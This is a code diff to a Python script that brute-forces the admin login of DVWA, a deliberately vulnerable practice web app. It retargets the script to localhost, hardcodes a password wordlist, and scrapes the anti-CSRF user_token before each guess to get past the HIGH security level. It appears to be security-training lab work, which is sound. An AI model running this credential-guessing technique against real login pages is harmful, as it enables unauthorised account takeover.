@@ -20,12 +20,12 @@ def send_credentials(session, url, data):
     return response
 
 if __name__=="__main__":
-    BASE_URL = "http://10.10.36.246"
+    BASE_URL = "http://127.0.0.1/dvwa"
     bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
-    filename = sys.argv[1]
+    filename = "password.txt"
     username = "admin"
 
-    q = get_passwords(filename)   
+    q = get_passwords(filename)
 
     with DVWASessionProxy(BASE_URL) as s:
         s.security = SecurityLevel.HIGH
@@ -41,7 +41,7 @@ if __name__=="__main__":
 
                 response = s.get(bruteforce_url)
                 soup = BeautifulSoup(response.text, 'html.parser')
-                user_token = soup.find("input", {"name": "user_token"})["value"]
+                user_token = soup.find("input", attrs= {"name": "user_token"})["value"]
                 data["user_token"] = user_token
             response = send_credentials(s, bruteforce_url, data)
             print(" "*40, end="\r")
